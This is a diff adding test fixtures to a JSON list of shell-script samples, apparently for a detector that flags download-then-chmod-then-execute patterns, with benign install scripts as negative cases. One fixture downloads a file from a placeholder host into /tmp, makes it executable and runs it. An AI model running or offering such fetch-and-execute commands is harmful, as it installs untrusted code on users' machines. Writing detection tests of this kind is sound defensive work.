@@ -105,5 +105,25 @@
     "name": "unix_visudo.sh",
     "text": "sudo visudo\n",
     "expected": null
+  },
+  {
+    "name": "command_tmp_three_lines.command",
+    "text": "#!/bin/bash\ncurl -fsSL -o /tmp/update https://example.invalid/update\nchmod +x /tmp/update\n/tmp/update\n",
+    "expected": "script_chmod_execute"
+  },
+  {
+    "name": "command_home_next_line.command",
+    "text": "#!/bin/sh\nchmod 755 ~/Library/Application\\ Support/x/agent\n~/Library/Application\\ Support/x/agent &\n",
+    "expected": "script_chmod_execute"
+  },
+  {
+    "name": "install_chmod_usr_bin_next.sh",
+    "text": "#!/bin/sh\ninstall -m 0755 app /opt/app/bin/app\nchmod 755 /opt/app/bin/app\n/usr/bin/systemctl restart app\n",
+    "expected": null
+  },
+  {
+    "name": "install_chmod_then_echo.sh",
+    "text": "#!/bin/sh\nchmod +x /tmp/build/configure\necho configured\n/tmp/build/configure --prefix=/usr\n",
+    "expected": null
   }
 ]
